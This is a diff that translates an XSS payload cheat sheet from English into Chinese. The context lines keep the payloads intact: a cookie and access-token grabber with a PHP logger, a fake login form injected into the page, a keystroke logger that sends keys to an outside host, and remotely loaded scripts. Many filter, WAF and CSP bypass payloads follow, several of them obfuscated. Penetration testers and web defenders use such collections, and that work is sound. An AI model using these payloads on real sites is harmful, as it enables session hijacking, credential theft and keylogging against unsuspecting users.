@@ -1,6 +1,6 @@
 # Cross Site Scripting
 
-Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.
+跨网站脚本安全漏洞(xss)是一种典型的计算机安全漏洞，存在于网络应用程序中。 Xss 允许攻击者将客户端脚本注入到其他用户查看的网页中。
 
 ## Summary 
 
@@ -58,7 +58,7 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
 
 ### Data grabber for XSS
 
-Obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page.
+获取管理员 cookie 或敏感访问token时，以下payload将其发送到受控页面。
 
 ```html
 <script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
@@ -67,7 +67,7 @@ Obtains the administrator cookie or sensitive access token, the following payloa
 <script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
 ```
 
-Write the collected data into a file.
+将收集到的数据写入一个文件。
 
 ```php
 <?php
@@ -80,7 +80,7 @@ fclose($fp);
 
 ### UI redressing 
 
-Leverage the XSS to modify the HTML content of the page in order to display a fake login form.
+利用 xss 来修改页面的 html 内容，以显示一个假的登录表单。
 
 ```html
 <script>
@@ -91,7 +91,7 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 
 ### Javascript keylogger
 
-Another way to collect sensitive data is to set a javascript keylogger.
+另一种收集敏感数据的方法是设置一个 javascript 键盘记录器。
 
 ```javascript
 <img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
@@ -99,7 +99,7 @@ Another way to collect sensitive data is to set a javascript keylogger.
 
 ### Other ways
 
-More exploits at [http://www.xss-payloads.com/payloads-list.html?a#category=all](http://www.xss-payloads.com/payloads-list.html?a#category=all):
+更多应用在： [http://www.xss-payloads.com/payloads-list.html?a#category=all](http://www.xss-payloads.com/payloads-list.html?a#category=all):
 
 - [Taking screenshots using XSS and the HTML5 Canvas](https://www.idontplaydarts.com/2012/04/taking-screenshots-using-xss-and-the-html5-canvas/)
 - [JavaScript Port Scanner](http://www.gnucitizen.org/blog/javascript-port-scanner/)
@@ -116,7 +116,7 @@ More exploits at [http://www.xss-payloads.com/payloads-list.html?a#category=all]
 
 ## XSS in HTML/Applications
 
-XSS Basic
+xss基础
 
 ```javascript
 Basic payload
@@ -174,7 +174,7 @@ XSS for HTML5
 <body ontouchmove=alert(1)>  // When a finger is dragged across the screen.
 ```
 
-XSS using script tag (external payload)
+Xss 使用脚本标记(外部有payload)
 
 ```javascript
 <script src=14.rs>
@@ -182,7 +182,7 @@ you can also specify an arbitratry payload with 14.rs/#payload
 e.g: 14.rs/#alert(document.domain)
 ```
 
-XSS in Hidden input
+在隐藏输入中输入 xss
 
 ```javascript
 <input type="hidden" accesskey="X" onclick="alert(1)">
@@ -195,7 +195,7 @@ DOM XSS
 #"><img src=/ onerror=alert(2)>
 ```
 
-XSS in JS Context (payload without quote/double quote from [@brutelogic](https://twitter.com/brutelogic)
+JS环境下的XSS(payload不带引号或者双引号）资料来自 [@brutelogic](https://twitter.com/brutelogic)
 
 ```javascript
 -(confirm)(document.domain)//
@@ -239,7 +239,7 @@ javascript://%0Aalert(1)
 javascript://anything%0D%0A%0D%0Awindow.alert(1)
 ```
 
-XSS with data:
+XSS的数据:
 
 ```javascript
 data:text/html,<script>alert(0)</script>
@@ -247,7 +247,7 @@ data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
 <script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
 ```
 
-XSS with vbscript: only IE
+XSS与vbscript:只有IE
 
 ```javascript
 vbscript:msgbox("XSS")
@@ -255,7 +255,7 @@ vbscript:msgbox("XSS")
 
 ## XSS in files
 
-** NOTE:** The XML CDATA section is used here so that the JavaScript payload will not be treated as XML markup.
+**注意:**这里使用了XML CDATA部分，因此JavaScript有效负载不会被视为XML标记。
 
 ```xml
 <name>
@@ -315,7 +315,7 @@ IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e
 IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);
 ```
 
-more payloads in ./files
+更多的payload在 ./file 文件夹下
 
 ### XSS in SWF flash application
 
@@ -359,7 +359,7 @@ div  {
 
 ## XSS in PostMessage
 
-> If the target origin is asterisk * the message can be sent to any domain has reference to the child page.
+> 如果目标原点是星号*，则可以将消息发送到任何具有子页面引用的域。
 
 ```html
 <html>
@@ -388,9 +388,9 @@ document.getElementById('btn').onclick = function(e){
 
 ### XSS Hunter
 
-Available at [https://xsshunter.com/app](https://xsshunter.com/app)
+可以在 [https://xsshunter.com/app](https://xsshunter.com/app)中利用
 
-> XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.
+> XSS Hunter允许您查找各种跨站点脚本漏洞，包括经常被遗漏的盲XSS。该服务通过托管专门的XSS探测来工作，这些探测在触发时扫描页面并将有关脆弱页面的信息发送给XSS Hunter服务。
 
 ```javascript
 "><script src=//yoursubdomain.xss.ht></script>
@@ -520,7 +520,7 @@ Set.constructor`al\x65rt\x2814\x29```;
 
 ### Bypass with incomplete html tag 
 
-Works on IE/Firefox/Chrome/Safari
+适用于IE和Firefox /Chrome/ Safari
 
 ```javascript
 <img src='1' onerror='alert(0)' <
@@ -545,7 +545,7 @@ http://localhost/bla.php?test=</script><script>alert(1)</script>
 
 ### Bypass quotes in mousedown event
 
-You can bypass a single quote with &#39; in an on mousedown event handler
+你可以用&#39在on mousedown事件处理程序中
 
 ```javascript
 <a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>
@@ -641,7 +641,7 @@ window['location']['href']="http://google.com"
 
 ### Bypass using an alternate way to execute an alert
 
-From [@brutelogic](https://twitter.com/brutelogic/status/965642032424407040) tweet.
+从[@brutelogic](https://twitter.com/brutelogic/status/965642032424407040) 的推特.
 
 ```javascript
 window['alert'](0)
@@ -660,7 +660,7 @@ content['alert'](6)
 [12].forEach(alert);
 ```
 
-From [@quanyang](https://twitter.com/quanyang/status/1078536601184030721) tweet.
+ [@quanyang](https://twitter.com/quanyang/status/1078536601184030721) 的推特.
 
 ```javascript
 prompt`${document.domain}`
@@ -669,7 +669,7 @@ document.location='java\rscript:alert(1)'
 document.location='java\tscript:alert(1)'
 ```
 
-From [@404death](https://twitter.com/404death/status/1011860096685502464) tweet.
+ [@404death](https://twitter.com/404death/status/1011860096685502464) 的推特.
 
 ```javascript
 eval('ale'+'rt(0)');
@@ -694,7 +694,7 @@ Set.constructor('ale'+'rt(13)')();
 Set.constructor`al\x65rt\x2814\x29```;
 ```
 
-Bypass using an alternate way to trigger an alert
+绕过使用另一种方式来触发警报
 
 ```javascript
 var i = document.createElement("iframe");
@@ -718,7 +718,7 @@ XSSObject.proxy(window, 'alert', 'window.alert', false);
 
 ### Bypass ">" using nothing 
 
-You don't need to close your tags.
+你不需要关闭你的标签。
 
 ```javascript
 <svg onload=alert(1)//
@@ -752,7 +752,7 @@ You don't need to close your tags.
 
 ### Bypass using Katana
 
-Using the [Katakana](https://github.com/aemkei/katakana.js) library.
+使用 [Katakana](https://github.com/aemkei/katakana.js) 库.
 
 ```javascript
 javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
@@ -764,7 +764,7 @@ javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!�
 ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()
 ```
 
-More alphabets on http://aem1k.com/aurebesh.js/#
+更多的字符 在 http://aem1k.com/aurebesh.js/#
 
 ### Bypass using ECMAScript6
 
@@ -804,7 +804,7 @@ E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert
 %EF%BC%9C becomes <
 ```
 
-Bypass using Unicode converted to uppercase
+使用转换为大写的Unicode绕过
 
 ```javascript
 İ (%c4%b0).toLowerCase() => i
@@ -848,8 +848,9 @@ Bypass using Unicode converted to uppercase
 
 ### Bypass using BOM
 
-Byte Order Mark (The page must begin with the BOM character.)
-BOM character allows you to override charset of the page
+字节顺序标记(页面必须以BOM字符开始)。
+
+BOM字符允许您覆盖页面的字符集
 
 ```js
 BOM Character for UTF-16 Encoding:
@@ -875,7 +876,7 @@ XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o
 
 ## CSP Bypass
 
-Check the CSP on [https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) and the post : [How to use Google’s CSP Evaluator to bypass CSP](https://appio.dev/vulns/google-csp-evaluator/)
+检查CSP在 [https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) and the post : [How to use Google’s CSP Evaluator to bypass CSP](https://appio.dev/vulns/google-csp-evaluator/)
 
 ### Bypass CSP using JSONP from Google (Trick by [@apfeifer27](https://twitter.com/apfeifer27))
 
@@ -885,11 +886,11 @@ Check the CSP on [https://csp-evaluator.withgoogle.com](https://csp-evaluator.wi
 <script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
 ```
 
-More JSONP endpoints available in [/Intruders/jsonp_endpoint.txt](Intruders/jsonp_endpoint.txt)
+在[/Intruders/jsonp_endpoint.txt](Intruders/jsonp_endpoint.txt)中有更多的JSONP端点可用。
 
 ### Bypass CSP by [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa)
 
-Works for CSP like `Content-Security-Policy: default-src 'self' 'unsafe-inline';`, [POC here](http://hsts.pro/csp.php?xss=f=document.createElement%28"iframe"%29;f.id="pwn";f.src="/robots.txt";f.onload=%28%29=>%7Bx=document.createElement%28%27script%27%29;x.src=%27//bo0om.ru/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;)
+适用于CSP，如 `Content-Security-Policy: default-src 'self' 'unsafe-inline';`, [POC here](http://hsts.pro/csp.php?xss=f=document.createElement%28"iframe"%29;f.id="pwn";f.src="/robots.txt";f.onload=%28%29=>%7Bx=document.createElement%28%27script%27%29;x.src=%27//bo0om.ru/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;)
 
 ```js
 script=document.createElement('script');
@@ -905,7 +906,7 @@ d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]
 
 ### Bypass CSP by [@akita_zen](https://twitter.com/akita_zen)
 
-Works for CSP like `script-src self`
+适用于CSP 像 `script-src self`
 
 ```js
 <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
@@ -939,7 +940,7 @@ xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
 </script><svg><script>alert(1)-%26apos%3B
 ```
 
-Live example by @brutelogic - [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?c1=</script><svg><script>alert(1)-%26apos%3B)
+例子如： @brutelogic - [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?c1=</script><svg><script>alert(1)-%26apos%3B)
 
 ### Incapsula WAF Bypass by [@Alra3ees](https://twitter.com/Alra3ees/status/971847839931338752)- 8th march 2018
 
